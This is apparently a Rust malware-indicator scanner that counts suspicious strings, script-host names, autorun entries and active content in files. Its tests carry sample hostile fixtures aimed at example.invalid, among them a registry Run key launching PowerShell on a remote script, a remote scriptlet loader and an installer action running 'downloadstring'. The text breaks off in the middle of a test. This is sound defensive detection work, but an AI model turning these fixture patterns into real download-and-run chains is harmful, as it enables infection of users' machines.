use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct StringIndicators {
    pub embedded_url_count: u32,
    pub embedded_ip_count: u32,
    pub suspicious_string_count: u32,
    pub registry_autorun_count: u32,
    pub autorun_inf_executable_command_count: u32,
    pub disk_image_autorun_executable_count: u32,
    pub email_executable_attachment_count: u32,
    pub script_host_reference_count: u32,
    pub remote_executable_url_count: u32,
    pub remote_clickonce_url_count: u32,
    pub remote_network_executable_path_count: u32,
    pub clickonce_marker_count: u32,
    pub java_web_start_marker_count: u32,
    pub remote_java_web_start_url_count: u32,
    pub windows_scriptlet_marker_count: u32,
    pub windows_installer_marker_count: u32,
    pub windows_installer_custom_action_count: u32,
    pub windows_appinstaller_marker_count: u32,
    pub remote_windows_app_package_url_count: u32,
    pub macro_auto_run_count: u32,
    pub rtf_external_object_count: u32,
    pub pdf_active_content_count: u32,
    pub web_document_active_content_count: u32,
}

pub fn extract_indicators(bytes: &[u8]) -> StringIndicators {
    let text = String::from_utf8_lossy(bytes).to_ascii_lowercase();
    let mut indicators = extract_indicators_from_text(&text);
    if let Some(utf16le_text) = utf16le_text_view(bytes) {
        indicators.merge(extract_indicators_from_text(&utf16le_text));
    }
    indicators.disk_image_autorun_executable_count = disk_image_autorun_executables(bytes, &text);
    if has_compound_file_binary_header(bytes) {
        indicators.windows_installer_marker_count =
            indicators.windows_installer_marker_count.saturating_add(1);
    }
    indicators
}

fn extract_indicators_from_text(text: &str) -> StringIndicators {
    let urls = embedded_urls(text);
    let embedded_url_count = urls.len() as u32;
    let remote_executable_url_count = urls
        .iter()
        .filter(|url| url_has_executable_or_script_suffix(url))
        .count() as u32;
    let remote_clickonce_url_count = urls
        .iter()
        .filter(|url| url_has_clickonce_suffix(url))
        .count() as u32;
    let remote_java_web_start_url_count = urls
        .iter()
        .filter(|url| url_has_java_web_start_suffix(url))
        .count() as u32;
    let remote_windows_app_package_url_count = urls
        .iter()
        .filter(|url| url_has_windows_app_package_suffix(url))
        .count() as u32;
    let remote_network_executable_path_count = remote_network_paths(text)
        .iter()
        .filter(|path| path_has_executable_or_script_suffix(path))
        .count() as u32;
    let clickonce_marker_count = clickonce_markers(text);
    let java_web_start_marker_count = java_web_start_markers(text);
    let windows_scriptlet_marker_count = windows_scriptlet_markers(text);
    let windows_installer_marker_count = windows_installer_markers(text);
    let windows_installer_custom_action_count = windows_installer_custom_actions(text);
    let windows_appinstaller_marker_count = windows_appinstaller_markers(text);
    let macro_auto_run_count = [
        "autoopen",
        "auto_open",
        "document_open",
        "workbook_open",
        "presentation_open",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum();
    let rtf_external_object_count = if is_rtf_text(text) {
        [
            "\\object",
            "\\objautlink",
            "\\objupdate",
            "\\template",
            "\\field",
            "ddeauto",
            "includepicture",
            "includetext",
        ]
        .iter()
        .map(|term| text.matches(term).count() as u32)
        .sum()
    } else {
        0
    };
    let pdf_active_content_count = if is_pdf_text(text) {
        [
            "/openaction",
            "/aa",
            "/js",
            "/javascript",
            "/launch",
            "/embeddedfile",
            "/submitform",
            "/xfa",
        ]
        .iter()
        .map(|term| text.matches(term).count() as u32)
        .sum()
    } else {
        0
    };
    let web_document_active_content_count = if is_web_document_text(text) {
        [
            "<script",
            "javascript:",
            "onload=",
            "onerror=",
            "createobjecturl",
            "mssaveoropenblob",
            ".download",
            "download=",
            "atob(",
            "fetch(",
            "xmlhttprequest",
        ]
        .iter()
        .map(|term| text.matches(term).count() as u32)
        .sum()
    } else {
        0
    };
    let embedded_ip_count = text
        .split(|c: char| !c.is_ascii_digit() && c != '.')
        .filter(|part| {
            let pieces = part.split('.').collect::<Vec<_>>();
            pieces.len() == 4
                && pieces
                    .iter()
                    .all(|piece| piece.parse::<u8>().is_ok() && !piece.is_empty())
        })
        .count();
    let suspicious_terms = [
        "invoke-expression",
        "iex ",
        "frombase64string",
        "virtualalloc",
        "createremotethread",
        "writeprocessmemory",
        "reg add",
        "schtasks",
        "vssadmin delete",
        "shadowcopy delete",
        "start-process",
        "downloadstring",
    ];
    let suspicious_string_count = suspicious_terms
        .iter()
        .map(|term| text.matches(term).count() as u32)
        .sum();
    let registry_autorun_count = ["currentversion\\run", "runonce"]
        .iter()
        .map(|term| text.matches(term).count() as u32)
        .sum();
    let autorun_inf_executable_command_count = autorun_inf_executable_commands(text);
    let disk_image_autorun_executable_count = 0;
    let email_executable_attachment_count = email_executable_attachments(text);
    let script_host_reference_count = [
        "wscript.shell",
        "mshta",
        "rundll32",
        "regsvr32",
        "scrobj.dll",
        "powershell",
        "cmd.exe",
        "cscript",
        "wscript",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum();
    StringIndicators {
        embedded_url_count,
        embedded_ip_count: embedded_ip_count as u32,
        suspicious_string_count,
        registry_autorun_count,
        autorun_inf_executable_command_count,
        disk_image_autorun_executable_count,
        email_executable_attachment_count,
        script_host_reference_count,
        remote_executable_url_count,
        remote_clickonce_url_count,
        remote_network_executable_path_count,
        clickonce_marker_count,
        java_web_start_marker_count,
        remote_java_web_start_url_count,
        windows_scriptlet_marker_count,
        windows_installer_marker_count,
        windows_installer_custom_action_count,
        windows_appinstaller_marker_count,
        remote_windows_app_package_url_count,
        macro_auto_run_count,
        rtf_external_object_count,
        pdf_active_content_count,
        web_document_active_content_count,
    }
}

impl StringIndicators {
    fn merge(&mut self, other: StringIndicators) {
        self.embedded_url_count = self
            .embedded_url_count
            .saturating_add(other.embedded_url_count);
        self.embedded_ip_count = self
            .embedded_ip_count
            .saturating_add(other.embedded_ip_count);
        self.suspicious_string_count = self
            .suspicious_string_count
            .saturating_add(other.suspicious_string_count);
        self.registry_autorun_count = self
            .registry_autorun_count
            .saturating_add(other.registry_autorun_count);
        self.autorun_inf_executable_command_count = self
            .autorun_inf_executable_command_count
            .saturating_add(other.autorun_inf_executable_command_count);
        self.disk_image_autorun_executable_count = self
            .disk_image_autorun_executable_count
            .saturating_add(other.disk_image_autorun_executable_count);
        self.email_executable_attachment_count = self
            .email_executable_attachment_count
            .saturating_add(other.email_executable_attachment_count);
        self.script_host_reference_count = self
            .script_host_reference_count
            .saturating_add(other.script_host_reference_count);
        self.remote_executable_url_count = self
            .remote_executable_url_count
            .saturating_add(other.remote_executable_url_count);
        self.remote_clickonce_url_count = self
            .remote_clickonce_url_count
            .saturating_add(other.remote_clickonce_url_count);
        self.remote_network_executable_path_count = self
            .remote_network_executable_path_count
            .saturating_add(other.remote_network_executable_path_count);
        self.clickonce_marker_count = self
            .clickonce_marker_count
            .saturating_add(other.clickonce_marker_count);
        self.java_web_start_marker_count = self
            .java_web_start_marker_count
            .saturating_add(other.java_web_start_marker_count);
        self.remote_java_web_start_url_count = self
            .remote_java_web_start_url_count
            .saturating_add(other.remote_java_web_start_url_count);
        self.windows_scriptlet_marker_count = self
            .windows_scriptlet_marker_count
            .saturating_add(other.windows_scriptlet_marker_count);
        self.windows_installer_marker_count = self
            .windows_installer_marker_count
            .saturating_add(other.windows_installer_marker_count);
        self.windows_installer_custom_action_count = self
            .windows_installer_custom_action_count
            .saturating_add(other.windows_installer_custom_action_count);
        self.windows_appinstaller_marker_count = self
            .windows_appinstaller_marker_count
            .saturating_add(other.windows_appinstaller_marker_count);
        self.remote_windows_app_package_url_count = self
            .remote_windows_app_package_url_count
            .saturating_add(other.remote_windows_app_package_url_count);
        self.macro_auto_run_count = self
            .macro_auto_run_count
            .saturating_add(other.macro_auto_run_count);
        self.rtf_external_object_count = self
            .rtf_external_object_count
            .saturating_add(other.rtf_external_object_count);
        self.pdf_active_content_count = self
            .pdf_active_content_count
            .saturating_add(other.pdf_active_content_count);
        self.web_document_active_content_count = self
            .web_document_active_content_count
            .saturating_add(other.web_document_active_content_count);
    }
}

fn is_rtf_text(text: &str) -> bool {
    text.contains("{\\rtf") || text.contains("\\rtf1")
}

fn is_pdf_text(text: &str) -> bool {
    text.contains("%pdf-")
}

fn is_web_document_text(text: &str) -> bool {
    text.contains("<!doctype html") || text.contains("<html") || text.contains("<svg")
}

fn autorun_inf_executable_commands(text: &str) -> u32 {
    if !text
        .lines()
        .any(|line| line.split(';').next().unwrap_or("").trim() == "[autorun]")
    {
        return 0;
    }
    text.lines()
        .filter(|line| {
            let line = line.split(';').next().unwrap_or("").trim();
            let Some((key, value)) = line.split_once('=') else {
                return false;
            };
            let key = key.trim();
            let is_command_key = matches!(key, "open" | "shellexecute")
                || (key.starts_with("shell\\") && key.ends_with("\\command"));
            is_command_key && command_value_has_executable_or_script_reference(value.trim())
        })
        .count() as u32
}

fn command_value_has_executable_or_script_reference(value: &str) -> bool {
    value
        .split(|ch: char| {
            ch.is_whitespace()
                || ch.is_control()
                || matches!(
                    ch,
                    '"' | '\'' | ',' | '(' | ')' | '[' | ']' | '{' | '}' | '<' | '>'
                )
        })
        .any(|token| {
            let token = token.trim_matches(|ch: char| {
                matches!(ch, '"' | '\'' | ',' | ';' | ')' | ']' | '}' | '<' | '>')
            });
            !token.is_empty() && path_has_executable_or_script_suffix(token)
        })
}

fn disk_image_autorun_executables(bytes: &[u8], text: &str) -> u32 {
    if !looks_like_optical_disk_image(bytes) || !text.contains("autorun.inf") {
        return 0;
    }
    u32::from(command_value_has_executable_or_script_reference(text))
}

fn looks_like_optical_disk_image(bytes: &[u8]) -> bool {
    bytes
        .windows(5)
        .any(|window| matches!(window, b"CD001" | b"NSR02" | b"NSR03"))
}

fn email_executable_attachments(text: &str) -> u32 {
    if !is_email_message_text(text) || !text.contains("content-disposition: attachment") {
        return 0;
    }
    text.lines()
        .filter(|line| {
            let line = line.split(';').collect::<Vec<_>>();
            line.iter().any(|part| {
                let Some((key, value)) = part.trim().split_once('=') else {
                    return false;
                };
                let key = key.trim();
                matches!(key, "filename" | "name")
                    && command_value_has_executable_or_script_reference(value.trim())
            })
        })
        .count() as u32
}

fn is_email_message_text(text: &str) -> bool {
    text.contains("mime-version:")
        && (text.contains("\nfrom:") || text.starts_with("from:"))
        && (text.contains("\nsubject:") || text.starts_with("subject:"))
}

fn utf16le_text_view(bytes: &[u8]) -> Option<String> {
    if bytes.len() < 8 {
        return None;
    }
    let units = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect::<Vec<_>>();
    let text = String::from_utf16_lossy(&units).to_ascii_lowercase();
    if text.contains("http://")
        || text.contains("https://")
        || text.contains("powershell")
        || text.contains("cmd.exe")
        || text.contains("wscript")
        || text.contains("cscript")
        || text.contains("regsvr32")
        || text.contains("scrobj")
        || text.contains("<scriptlet")
        || text.contains(".sct")
        || text.contains(".wsc")
        || text.contains("\\\\")
        || text.contains("file://")
        || text.contains("autoopen")
        || text.contains("document_open")
        || text.contains("workbook_open")
        || text.contains("[autorun]")
        || text.contains("mime-version:")
        || text.contains("content-disposition: attachment")
        || text.contains("<jnlp")
        || text.contains(".jnlp")
        || text.contains("<appinstaller")
        || text.contains(".appinstaller")
        || text.contains(".appx")
        || text.contains(".msix")
        || text.contains("<!doctype html")
        || text.contains("<html")
        || text.contains("<svg")
    {
        Some(text)
    } else {
        None
    }
}

fn embedded_urls(text: &str) -> Vec<&str> {
    let mut urls = Vec::new();
    for marker in ["http://", "https://"] {
        let mut search_start = 0;
        while let Some(relative_start) = text[search_start..].find(marker) {
            let start = search_start + relative_start;
            let rest = &text[start..];
            let end = rest
                .find(|ch: char| {
                    ch.is_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')' | ']' | '}')
                })
                .unwrap_or(rest.len());
            urls.push(&rest[..end]);
            search_start = start + marker.len();
        }
    }
    urls
}

fn url_has_executable_or_script_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    path_has_executable_or_script_suffix(path)
}

fn url_has_clickonce_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".application", ".appref-ms"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn url_has_java_web_start_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".jar", ".jnlp"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn url_has_windows_app_package_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".appx", ".msix", ".appxbundle", ".msixbundle"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn remote_network_paths(text: &str) -> Vec<&str> {
    let mut paths = Vec::new();
    collect_delimited_refs(text, "\\\\", &mut paths);
    collect_delimited_refs(text, "file://", &mut paths);
    paths
        .into_iter()
        .filter(|path| is_remote_network_path(path))
        .collect()
}

fn collect_delimited_refs<'a>(text: &'a str, marker: &str, values: &mut Vec<&'a str>) {
    let mut search_start = 0;
    while let Some(relative_start) = text[search_start..].find(marker) {
        let start = search_start + relative_start;
        let rest = &text[start..];
        let end = rest
            .find(|ch: char| {
                ch.is_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')' | ']' | '}')
            })
            .unwrap_or(rest.len());
        values.push(&rest[..end]);
        search_start = start + marker.len();
    }
}

fn is_remote_network_path(path: &str) -> bool {
    if path.starts_with("\\\\?\\") || path.starts_with("\\\\.\\") {
        return false;
    }
    if path.starts_with("\\\\") {
        let rest = path.trim_start_matches('\\');
        let mut pieces = rest.split(['\\', '/']);
        return pieces.next().is_some_and(|host| !host.is_empty())
            && pieces.next().is_some_and(|share| !share.is_empty());
    }
    if let Some(rest) = path.strip_prefix("file://") {
        if rest.starts_with('/') || rest.is_empty() {
            return false;
        }
        let host = rest.split(['/', '\\']).next().unwrap_or_default();
        return !host.is_empty() && host != "localhost";
    }
    false
}

fn path_has_executable_or_script_suffix(path: &str) -> bool {
    const EXECUTABLE_OR_SCRIPT_SUFFIXES: [&str; 25] = [
        ".exe", ".scr", ".com", ".pif", ".cpl", ".msi", ".msp", ".msu", ".bat", ".cmd", ".ps1",
        ".psm1", ".vbs", ".vbe", ".js", ".jse", ".mjs", ".cjs", ".wsf", ".hta", ".sct", ".wsc",
        ".jar", ".jnlp", ".dll",
    ];
    let path = path.split(['?', '#']).next().unwrap_or(path);
    EXECUTABLE_OR_SCRIPT_SUFFIXES
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn clickonce_markers(text: &str) -> u32 {
    [
        "deploymentprovider",
        "asmv2:deployment",
        "urn:schemas-microsoft-com:asm.v2",
        "<deployment ",
        "<deployment>",
        "<dependentassembly",
        "applicationreference",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn java_web_start_markers(text: &str) -> u32 {
    [
        "<jnlp",
        "jnlp spec",
        "application-desc",
        "applet-desc",
        "installer-desc",
        "<jar ",
        " jar href",
        "<extension ",
        "java-vm-args",
        "main-class",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn windows_scriptlet_markers(text: &str) -> u32 {
    [
        "<scriptlet",
        "scriptlet",
        "<registration",
        "<public",
        "<script ",
        "language=\"jscript",
        "language=\"vbscript",
        "regsvr32",
        "scrobj.dll",
        "script:",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn windows_installer_markers(text: &str) -> u32 {
    [
        "windows installer",
        "msiexec",
        "installexecutesequence",
        "installuisequence",
        "productcode",
        "packagecode",
        "msipatchmetadata",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn windows_installer_custom_actions(text: &str) -> u32 {
    [
        "customaction",
        "custom action",
        "wixquietexec",
        "wixsilentexec",
        "quietexec",
        "deferred",
        "commit custom",
        "rollback custom",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn windows_appinstaller_markers(text: &str) -> u32 {
    [
        "<appinstaller",
        "appinstaller",
        "mainpackage",
        "<mainbundle",
        "packageuri",
        "uri=\"",
        "schemas.microsoft.com/appx/appinstaller",
    ]
    .iter()
    .map(|term| text.matches(term).count() as u32)
    .sum()
}

fn has_compound_file_binary_header(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn string_indicators_count_registry_and_shortcut_carriers() {
        let indicators = extract_indicators(
            br#"
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="powershell https://example.invalid/update.ps1"
[InternetShortcut]
URL=https://example.invalid/setup.exe
IconFile=cmd.exe
"#,
        );

        assert_eq!(indicators.embedded_url_count, 2);
        assert_eq!(indicators.remote_executable_url_count, 2);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.windows_appinstaller_marker_count, 0);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.registry_autorun_count, 1);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
        assert!(indicators.script_host_reference_count >= 2);
    }

    #[test]
    fn ordinary_web_link_is_not_remote_executable_url() {
        let indicators =
            extract_indicators(b"[InternetShortcut]\nURL=https://example.invalid/readme.html");

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn utf16le_remote_executable_url_is_counted() {
        let mut bytes = Vec::new();
        for unit in "ShellLink target https://example.invalid/support.ps1 cmd.exe".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn clickonce_manifest_markers_and_remote_executable_are_counted() {
        let indicators = extract_indicators(
            br#"<assembly xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
<asmv2:deployment install="true">
<asmv2:deploymentProvider codebase="https://example.invalid/setup.exe" />
</asmv2:deployment>
</assembly>"#,
        );

        assert!(indicators.clickonce_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
    }

    #[test]
    fn clickonce_appref_ms_remote_application_url_is_counted() {
        let indicators = extract_indicators(
            b"https://example.invalid/Support.application#Support, Culture=neutral",
        );

        assert_eq!(indicators.remote_clickonce_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_markers_and_remote_jar_are_counted() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+" codebase="https://example.invalid/app/">
<information><title>Support</title></information>
<resources><jar href="https://example.invalid/app/support.jar" /></resources>
<application-desc main-class="com.example.Support" />
</jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 3);
        assert_eq!(indicators.remote_java_web_start_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_document_link_without_archive_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+"><information href="https://example.invalid/readme.html" /></jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 1);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_scriptlet_markers_and_remote_script_are_counted() {
        let indicators = extract_indicators(
            br#"<scriptlet>
<registration progid="Support.Loader" />
<script language="JScript">
var x = GetObject("script:https://example.invalid/loader.sct");
</script>
</scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn windows_scriptlet_document_link_without_payload_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<scriptlet><registration progid="Docs.Viewer" /><script language="JScript">var help="https://example.invalid/readme.html";</script></scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_installer_custom_action_markers_are_counted() {
        let mut bytes = vec![0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1];
        bytes.extend_from_slice(
            b"Windows Installer CustomAction WixQuietExec powershell downloadstring https://example.invalid/setup.msp",
        );

        let indicators = extract_indicators(&bytes);

        assert!(indicators.windows_installer_marker_count >= 2);
        assert!(indicators.windows_installer_custom_action_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
        assert!(indicators.suspicious_string_count >= 1);
    }

    #[test]
    fn windows_installer_document_link_without_custom_action_is_not_custom_action() {
        let indicators = extract_indicators(
            b"Windows Installer ProductCode https://example.invalid/readme.html",
        );

        assert!(indicators.windows_installer_marker_count >= 2);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_appinstaller_manifest_and_remote_package_are_counted() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msix" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_appinstaller_document_link_without_package_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/readme.html" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn utf16le_unc_executable_path_is_counted() {
        let mut bytes = Vec::new();
        for unit in r"ShellLink target \\fileserver\share\support.ps1".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_unc_document_path_is_not_counted() {
        let indicators = extract_indicators(br"\\fileserver\share\readme.txt");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn local_file_url_executable_path_is_not_remote_network_path() {
        let indicators = extract_indicators(b"file:///C:/Users/Public/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn remote_file_url_executable_path_is_counted() {
        let indicators = extract_indicators(b"file://fileserver/share/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn macro_auto_run_terms_are_counted() {
        let indicators = extract_indicators(
            b"Sub AutoOpen()\nEnd Sub\nPrivate Sub Document_Open()\nEnd Sub\nWorkbook_Open",
        );

        assert_eq!(indicators.macro_auto_run_count, 3);
    }

    #[test]
    fn utf16le_macro_auto_run_terms_are_counted() {
        let mut bytes = Vec::new();
        for unit in "Sub AutoOpen(): powershell https://example.invalid/payload.ps1".encode_utf16()
        {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.macro_auto_run_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn rtf_external_object_terms_are_counted() {
        let indicators = extract_indicators(
            br"{\rtf1{\object\objautlink\objupdate file://fileserver/share/support.vbs}{\field{\*\fldinst INCLUDEPICTURE https://example.invalid/payload.ps1}}}",
        );

        assert!(indicators.rtf_external_object_count >= 4);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_object_words_outside_rtf_are_not_rtf_object_terms() {
        let indicators =
            extract_indicators(b"object field includepicture https://example.invalid/payload.ps1");

        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn pdf_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>\nendobj",
        );

        assert!(indicators.pdf_active_content_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_pdf_are_not_pdf_active_content() {
        let indicators =
            extract_indicators(b"/OpenAction /JavaScript https://example.invalid/payload.js");

        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn web_document_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            br#"<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>"#,
        );

        assert!(indicators.web_document_active_content_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_web_document_are_not_web_document_active_content() {
        let indicators =
            extract_indicators(b"<script>javascript: atob('x') https://example.invalid/payload.js");

        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn autorun_inf_executable_commands_are_counted() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=support.exe /quiet
shellexecute=file://fileserver/share/support.vbs
shell\open\command=cmd.exe /c support.cmd
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 3);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn ordinary_inf_text_without_autorun_section_is_not_autorun_command() {
        let indicators = extract_indicators(
            br#"
[version]
signature="$windows nt$"
open=support.exe
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
    }

    #[test]
    fn autorun_inf_document_link_is_not_executable_command() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=readme.txt
shellexecute=https://example.invalid/readme.html
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn disk_image_autorun_executable_is_counted() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(
            b"\0AUTORUN.INF\0[autorun]\0open=setup.exe\0shell\\open\\command=runme.cmd\0",
        );

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 1);
    }

    #[test]
    fn ordinary_iso_text_without_disk_marker_is_not_disk_image_autorun() {
        let indicators =
            extract_indicators(b"autorun.inf [autorun] open=setup.exe without image marker");

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn disk_image_autorun_document_link_is_not_executable() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(b"\0AUTORUN.INF\0[autorun]\0open=readme.pdf\0");

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn email_executable_attachment_names_are_counted() {
        let indicators = extract_indicators(
            br#"From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 2);
    }

    #[test]
    fn ordinary_email_document_attachment_is_not_executable_attachment() {
        let indicators = extract_indicators(
            br#"From: docs@example.invalid
Subject: notes
MIME-Version: 1.0
